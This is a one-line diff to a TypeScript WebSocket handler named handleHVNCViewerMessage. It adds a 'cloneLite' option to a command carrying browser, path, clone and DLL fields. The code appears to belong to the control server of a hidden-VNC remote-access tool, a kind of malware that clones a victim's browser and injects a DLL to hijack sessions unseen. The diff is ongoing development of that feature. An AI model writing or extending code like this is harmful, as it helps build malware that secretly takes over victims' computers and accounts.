@@ -646,6 +646,7 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         browser: String(payload.browser || ""),
         path: String(payload.path || ""),
         clone: payload.clone !== false,
+        cloneLite: payload.cloneLite === true,
         dll: dllData,
       });
       break;
